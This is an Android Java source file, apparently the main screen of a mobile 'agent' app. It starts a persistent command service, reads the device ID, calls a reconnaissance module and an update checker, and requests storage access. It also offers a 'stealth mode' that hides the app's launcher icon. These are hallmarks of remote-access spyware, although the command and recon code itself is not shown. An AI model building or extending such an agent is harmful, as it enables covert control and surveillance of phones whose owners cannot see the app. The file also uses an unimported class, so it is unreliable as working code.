package com.mobilemorph.agent;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.Manifest;
import android.util.Log;
import android.widget.Switch;
import android.widget.TextView;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.mobilemorph.agent.services.CommandService;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {
    private static final int REQUEST_PERMISSIONS = 100;
    private SharedPreferences prefs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button startAgentButton = findViewById(R.id.startAgentButton);
        startAgentButton.setOnClickListener(v -> {
            Intent serviceIntent = new Intent(MainActivity.this, CommandService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            Toast.makeText(MainActivity.this, "Agent Started", Toast.LENGTH_SHORT).show();
        });

        TextView deviceIdText = findViewById(R.id.deviceIdText);
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        deviceIdText.setText("Device ID: " + deviceId);
        prefs = getSharedPreferences("agent", MODE_PRIVATE);

        // Toggle for stealth mode
        Switch serverToggle = findViewById(R.id.serverToggle);
        boolean stealth = prefs.getBoolean("stealth_mode", false);
        serverToggle.setChecked(stealth);

        // On toggle click, update stealth mode setting
        serverToggle.setOnCheckedChangeListener((buttonView, isChecked) -> {
            prefs.edit().putBoolean("stealth_mode", isChecked).apply();
            if (isChecked) {
                hideLauncherIcon();
                finish();  // Optional: auto-close after enabling stealth
            }
        });

        // Start core agent behavior
        ReconModule.runRecon(this);
        UpdateChecker.checkForUpdate(this);

        requestRuntimePermissions();  // Will start CommandService if granted
    }

    private void requestRuntimePermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
                        REQUEST_PERMISSIONS);
                return;
            }
        }
        startAgentService();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSIONS && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            startAgentService();
        }
    }

    private void startAgentService() {
        Intent serviceIntent = new Intent(this, CommandService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    private void hideLauncherIcon() {
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                PackageManager p = getPackageManager();
                ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class);
                p.setComponentEnabledSetting(componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP);
            }
        }, 1000); // delay optional
    }
}
